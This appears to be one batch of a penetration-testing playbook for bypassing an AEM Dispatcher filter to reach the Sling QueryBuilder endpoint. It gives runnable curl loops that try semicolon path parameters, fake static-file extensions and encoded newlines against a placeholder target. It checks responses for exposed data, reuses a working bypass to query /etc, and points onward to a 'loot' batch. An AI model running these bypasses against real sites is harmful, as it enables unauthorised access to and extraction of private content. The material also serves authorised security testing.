# Batch 04 — Dispatcher bypass: semicolon + fake extension

## objective

Make the dispatcher think the request is a **static file** (css/js/png/…) while Sling still runs **QueryBuilder**.  
Only this family of tricks — no GraphQL, no `form` selector yet.

## estimated_time

60–90 minutes

## prerequisites

- Batch 03 showed QueryBuilder blocked (or you want a second access path)
- Baseline: plain `/bin/querybuilder.json` status recorded

## testing_workflow

### 1) Baseline (30 seconds)

```bash
T="https://TARGET"
curl -sk -o /dev/null -w "direct:%{http_code}\n" \
  "$T/bin/querybuilder.json?path=/content&p.limit=1"
```

### 2) Technique A — path parameter + allowed extension

```bash
# Dispatcher often ignores ';' parsing the way Sling does
for ext in css js png jpg html pdf woff2 svg; do
  u="/bin/querybuilder.json;x='a/b.${ext}/c'?path=/content&p.limit=3"
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  size=$(wc -c </tmp/qb.out)
  echo "$code $size  $u"
  grep -qE 'hits|success|jcr:' /tmp/qb.out && echo "  >> LOOKS OPEN" && head -c 200 /tmp/qb.out && echo
done
```

### 3) Technique B — classic noise variants (same idea)

```bash
for u in \
  "/bin/querybuilder.json;%0aa.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json/a.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json;.css?path=/content&p.limit=3"
do
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  size=$(wc -c </tmp/qb.out)
  echo "$code $size  $u"
  grep -qE 'hits|success' /tmp/qb.out && head -c 200 /tmp/qb.out && echo
done
```

### 4) Technique C — reuse winner on another path

```bash
# Example if css semicolon worked:
QB="$T/bin/querybuilder.json;x='a/b.css/c'"
curl -sk -G "$QB" --data-urlencode "path=/etc" --data-urlencode "p.limit=3" | head -c 400; echo
```

Save:

```text
WORKING_BYPASS=...
```

## decision_points

| If… | Then… |
|-----|--------|
| Any variant returns QueryBuilder JSON | Set `QB=...` → go **07** (or finish timer then 07) |
| All fail | Continue **05** (different bypass family) |
| WAF 403 on `;` | Try GraphQL hybrid in **05**; reduce rate |

## expected_findings

- Dispatcher parse differential (reportable when chained to data access)
- Stable `QB` URL for loot batches

## next_batch_to_continue_with

- Success → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
- Failure → **[05-bypass-graphql.md](./05-bypass-graphql.md)**
